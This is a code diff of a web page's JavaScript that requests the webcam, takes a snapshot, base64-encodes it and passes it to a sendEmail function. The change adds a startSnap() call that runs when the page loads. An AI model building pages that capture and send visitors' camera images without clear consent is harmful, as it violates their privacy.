@@ -27,9 +27,8 @@
         const snap=document.getElementById('snap');
         const errorMsgElement=document.getElementById('span#ErrorMsg');
 
-        main();
 
-        async function main(){
+            /*
             async function listDevices(){
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 //console.log(devices)
@@ -40,6 +39,7 @@
             const CAMID=videoDevices[0].deviceId
             document.writeln(CAMID)
             console.log(CAMID)
+            */
 
 
             const constraints={
@@ -54,10 +54,10 @@
                     ideal: 1080,
                     max: 1440
                     },
-                    facingMode: 'user'
-                },deviceId: {
+                    //facingMode: 'user'
+                }/*,deviceId: {
                     exact: CAMID
-                }
+                }*/
             };
 
             async function init(){
@@ -94,6 +94,7 @@
                 }
                 sendEmail(base64image,Body)
         }
-    }
+    startSnap()
+    
     </script>
 </html>
